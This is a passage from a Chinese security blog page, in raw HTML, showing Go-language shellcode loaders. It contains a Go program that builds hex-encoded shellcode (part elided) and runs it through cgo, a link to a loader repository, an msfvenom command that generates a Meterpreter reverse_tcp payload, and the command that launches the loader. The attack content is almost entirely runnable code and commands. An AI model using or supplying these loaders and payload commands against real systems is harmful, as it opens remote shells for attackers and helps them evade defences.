<h2><span id="go">Go</span></h2><h3><span id="内联c加载">内联C加载</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import &quot;C&quot;</span><br><span class="line">import &quot;unsafe&quot;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    buf := &quot;&quot;</span><br><span class="line">    buf += &quot;\xdd\xc6\xd9\x74\x24\xf4\x5f\x33\xc9\xb8\xb3\x5e\x2c&quot;</span><br><span class="line">    ...省略...</span><br><span class="line">    buf += &quot;\xc9\xb1\x97\x31\x47\x1a\x03\x47\x1a\x83\xc7\x04\xe2&quot;</span><br><span class="line">    // at your call site, you can send the shellcode directly to the C</span><br><span class="line">    // function by converting it to a pointer of the correct type.</span><br><span class="line">    shellcode := []byte(buf)</span><br><span class="line">    C.call((*C.char)(unsafe.Pointer(&amp;shellcode[0])))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3><span id="加载器">加载器</span></h3><p><a href="https://github.com/brimstone/go-shellcode" target="_blank" rel="noopener">https://github.com/brimstone/go-shellcode</a></p>
<p>生成hex格式的shellcode</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -f hex -o rev.hex LHOST=127.0.0.1 LPORT=4444</span><br></pre></td></tr></table></figure>
<p>加载器进行加载</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\windows\temp&gt;sc.exe shellcode</span><br></pre></td></tr></table></figure>
</div></article></div></section><footer><div class="paginator"><a href="/posts/notes/CobaltStrike+MetaSploit 实战联动.html" class="prev">上一篇</a><a href="/posts/notes/Mimikatz明文密码抓取.html" class="next">下一篇</a></div><div class="copyright"><p>© 2016 - 2024 <a href="https://uknowsec.cn">uknow</a>  Stay hungry,Stay foolish.</p></div></footer></div><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-115504647-1",'auto');ga('send','pageview');</script><script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?225ebcce29d319519ac7c7690425d1d4";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script></body></html>